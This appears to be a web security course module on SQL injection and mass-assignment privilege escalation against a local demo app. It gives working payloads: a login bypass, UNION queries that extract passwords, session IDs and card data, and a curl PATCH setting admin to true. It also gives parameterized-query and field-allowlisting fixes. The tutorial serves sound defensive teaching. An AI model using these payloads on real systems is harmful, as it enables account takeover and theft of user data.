# Injection Attacks

In this example, we're going to look at two different types of attacks:

- SQL Injection
- Privilege Escalation

## SQL Injection

SQL Injection is a (web) security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve, and it can also enable an attacker to alter data in the database.

### How the Attack Works

1. User inputs data into an application.
2. Application dynamically constructs an SQL query using that input.
3. Malicious input alters the SQL query in an unintended way.

#### Bypassing Login

For example, if we log in using the password `' OR 1=1--`, our malicious password will create the following SQL query:

```sql
SELECT * FROM users WHERE email = 'robert.d.tables@frontendmasters.com' AND password = '' OR 1=1--'
```

In this case `1` does, in fact, equal `1`, which means that query was successful and the user was successfully returned. For this _particular_ vulnerability, this _particularly_ bad because from this point forward, we've set a session token that will allow us to move around the site as that user.

#### Getting More Than You Asked For

Let's take a look at `/api/users`.

It's kind of annoying (depending on your perspective, I suppose) that you can only get an equal number of columns as the original query. But, if we're clever, we can get around that. Consider this lovely URL.

```
/api/users?search=%27%20UNION%20SELECT%20id%20||%20%27%20-%20%27%20||%20password%20||%20%27%20-%20%27%20||%20email%20FROM%20users%20--
```

For if we take out all of the encoding characters, it looks something like this:

```
' UNION SELECT id || ' - ' || password || ' - ' || email FROM users --
```

An attacker can run arbitrary SQL. The constructed SQL query becomes:

```sql
SELECT name FROM users WHERE name LIKE '' UNION SELECT id || ' - ' || password || ' - ' || email FROM users --%'
```

This query now returns some very sensitive data from the users table. We'll talk a little bit more about storing passwords in plain text later on, but regardless—this wouldn't be ideal even if the passwords were encrypted.

We can target the `products` table as well, which has a larger number of columns. We can use `NULL` values to pad the number of columns needed.

```
/api/products?search=' OR 1=1 UNION SELECT sessionId, userId, NULL, NULL, NULL, NULL FROM sessions --
```

Alternatively, we can use a similar approach to get our hands on some sensitive information.

```
/api/products?search=' OR 1=1 UNION SELECT creditCard, cvv, expirationDate, NULL, NULL, NULL FROM users --
```

You get the idea. There are probably plenty of other ways that we could get our hands on the data using the same techniques. Let's look at other flavors of this attack before we go about fixing the issue.

#### Stealing Sessions

It's one thing to be able to steal information about your users, but it's far worse if you can steal the important information needed to _become_ your users.

```
/api/users?search=' UNION SELECT sessionId FROM sessions --
```

This will give us all of the session IDs. We'll see something like this:

```json
{
  "users": [
    { "name": "6d130686184ea5d67ed0e58fb9409b34" },
    { "name": "d771c126c65e0ab66a2979b0086a3d70" }
    //…
  ]
}
```

Now, we _could_ adjust our cookie to any one of these session IDs and impersonate a user.

### Dropping Tables Like They're Hot

The `sqlite3` library is pretty good about not letting us execute writes or other non-idempotent actions in the `db.all` and `db.get` methods and writing my own SQLite driver that didn't have these protections didn't feel like the best use of my time. But, that doesn't mean we're totally safe.

## Steps to Fix and Secure the Application

To mitigate SQL Injection, always use parameterized queries (also known as prepared statements).

### Step-by-Step Guide for Remediation

Replace dynamic query construction with parameterized queries.

```javascript
app.get('/users', async (req, res) => {
  const name = req.query.name;

  try {
    // Using parameterized query to prevent SQL Injection
    const users = await db.all(`SELECT * FROM users WHERE name = ?`, [name]);
    res.json(users);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});
```

In this query, `?` acts as a placeholder for the `name` parameter. The database driver safely handles its insertion into the SQL query.

#### Securely Handle User Input

We can also use prepared statements in SQL to futher abstract away the query itself.

```javascript
const usersQuery = await db.prepare(`SELECT * FROM users WHERE name = ?`);
const users = await usersQuery.all(name);
```

This ensures the input data is treated as a parameter, not a part of the SQL string.

## Privilege Escalation

This example uses a SQLite database and I'm too lazy to whip up a NoSQL database—so, we're going to fake it for a moment.

You've probably done something like this in JavaScript:

```js
const original = { a: 1, b: 2 };
const updated = { ...original };
```

Now, imagine that it something a little more nefarious.

```js
const user = {
  id: 1,
  name: 'Bobby Tables',
};

const updated = {
  ...user,
  admin: true,
};
```

In some cases—most commonly with `PATCH` operations, you can slide in some additional data either using the form field or by sending a maliciously crafted HTTP request with additional data.

We can add an additional input to our form or even just change one of the existing ones.

```html
<input type="hidden" name="admin" value="true" />
```

This will now be included in the form payload. Alternatively, we can send a `curl` request.

```sh
curl 'http://localhost:4007/profile' \
  -X 'PATCH' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=987292f04aaca60af0c3c56b93326da9' \
  -H 'Origin: http://localhost:4007' \
  -H 'Referer: http://localhost:4007/profile' \
  --data-raw '{"admin":true}'
```

### Solving for the Problem

This one is pretty simple: be specific about what you wan to update:

```ts
const { name, email, password /* etc */ } = req.body;
const fields = toParamsAndValues({ name, email, password });
```

## Further Reading

- [Mozilla Developer Network: SQL Injection](https://developer.mozilla.org/en-US/docs/Glossary/SQL_Injection)
- [PortSwigger: SQL injection](https://portswigger.net/web-security/sql-injection)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
